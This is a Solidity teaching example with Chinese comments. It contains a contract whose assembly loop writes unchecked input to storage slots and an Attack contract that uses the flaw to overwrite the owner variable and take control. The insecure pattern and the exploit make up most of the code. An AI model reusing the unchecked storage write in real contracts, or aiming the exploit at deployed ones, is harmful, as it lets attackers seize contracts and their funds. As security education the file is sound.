// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
漏洞名稱：Bufer-Based Vulnerabilities

描述：
本範例示範在使用低階 assembly 操作時未檢查寫入資料長度，
導致輸入資料超出預留 buffer 大小，進而覆寫掉鄰近的重要狀態變數，
例如本合約中的 owner 狀態變數（存放於 storage slot 1）。
攻擊者可透過提供超長資料，藉由覆蓋 storage slot 的方式竄改合約內重要變數，
甚至取得管理權限。

攻擊範例說明：
1. 部署 VulnerableContract，owner 為部署者。
2. 攻擊者透過呼叫 writeData 函式，傳入一個長度為 2 的 bytes32 陣列。
   第一個元素隨意；第二個元素則置為攻擊者地址之 bytes32 格式值。
3. 由於 assembly 寫入的 storage slot 是從 0 開始，
   第 0 個元素會寫入 buffer[0]，而第 1 個元素會覆寫 owner，
   因此攻擊者將取得該合約的 owner 權限。
*/

contract VulnerableContract {
    // 狀態變數：固定大小的 buffer，長度為 1，存放於 storage slot 0
    bytes32[1] public buffer;
    // 狀態變數：owner 存放於 storage slot 1
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // 漏洞重點：未檢查 _data 陣列輸入的長度，使用 assembly 直接寫入 storage
    function writeData(bytes32[] calldata _data) external {
        uint256 len = _data.length;
        for (uint256 i = 0; i < len; i++) {
            assembly {
                // 計算 storage position，此處不檢查 i 是否超出 buffer 大小
                // 第一個寫入將對應到 buffer[0] (slot 0), 第二個寫入將覆寫 owner (slot 1)
                let slot := i
                // 注意：calldataload 讀取 calldata 中 _data 的 i 項，32 字節一個元素
                sstore(slot, calldataload(add(_data.offset, mul(i, 32))))
            }
        }
    }
}

/*
攻擊合約範例：
部署並呼叫攻擊合約後，會傳送經過精心構造的資料覆蓋 VulnerableContract 中的 owner，使得攻擊者取得合約控制權。
*/

contract Attack {
    VulnerableContract public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    function attack() public {
        // 製作一個長度為 2 的資料陣列
        bytes32[] memory maliciousData = new bytes32[](2);
        // 元素 0: 隨意資料
        maliciousData[0] = bytes32(uint256(0));
        // 元素 1: 以攻擊者的地址覆寫 owner (將 address 轉為 uint160 再轉 uint256, 最後轉 bytes32)
        maliciousData[1] = bytes32(uint256(uint160(msg.sender)));

        // 呼叫 vulnerable 合約寫入資料，透過 assembly 寫入過程覆蓋 owner
        vulnerable.writeData(maliciousData);
    }
}
